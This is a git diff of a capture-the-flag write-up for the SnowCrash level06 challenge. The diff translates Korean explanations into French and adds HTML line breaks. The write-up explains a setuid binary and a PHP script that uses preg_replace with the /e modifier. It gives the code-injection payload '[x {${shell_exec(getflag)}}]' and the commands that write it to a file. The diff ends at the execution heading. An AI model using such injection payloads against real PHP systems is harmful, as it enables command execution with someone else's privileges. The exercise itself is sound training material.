@@ -1,5 +1,7 @@
 # Level06
 
+</br></br>
+
 ## ls -l
 
 ```zsh
@@ -9,15 +11,18 @@ total 12
 -rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
 ```
 
-두 파일전부다 실행 및 읽기가능
-level06파일에서 rws는 read-write-execute + setuid를 의미합니다. 이것은 해당 파일을 실행할 때, 실행하는 사용자가 파일 소유자(flag06)의 권한을 가지게 됩니다. 따라서 level06 사용자가 level06 파일을 실행하면, 실행하는 동안 flag06 사용자의 권한을 가지게 됩니다.
+Les deux fichiers sont exécutables et lisibles
+Dans le fichier level06, rws signifie lecture-écriture-exécution + setuid. Cela signifie que lorsque le fichier est exécuté, l'utilisateur exécutant a les privilèges du propriétaire du fichier (flag06). Ainsi, lorsque l'utilisateur level06 exécute le fichier level06, il aura les privilèges de l'utilisateur flag06 lors de son exécution.
 
-## level06 실행
+</br></br>
+
+## d'exécution level06
 
 ```zsh
 level06@SnowCrash:~$ ./level06
 PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
 ```
+</br></br>
 
 ## level06.php
 
@@ -30,6 +35,7 @@ function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\]
 $r = x($argv[1], $argv[2]); print $r;
 ?>
 ```
+</br></br>
 
 ## regex and shell_exec
 reg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a)
@@ -40,11 +46,15 @@ regex : (\[x (.*)\])
 
 [x {${shell_exec(getflag)}}]
 
+</br></br>
+
 ## make file 
 ```zsh
 level06@SnowCrash:~$ mkdir /tmp/level06
 level06@SnowCrash:~$ echo '[x {${shell_exec(getflag)}}]' > /tmp/level06/flag06
 ```
+
+</br></br>
 
 ## execute level06 with file flag06
 ```zsh
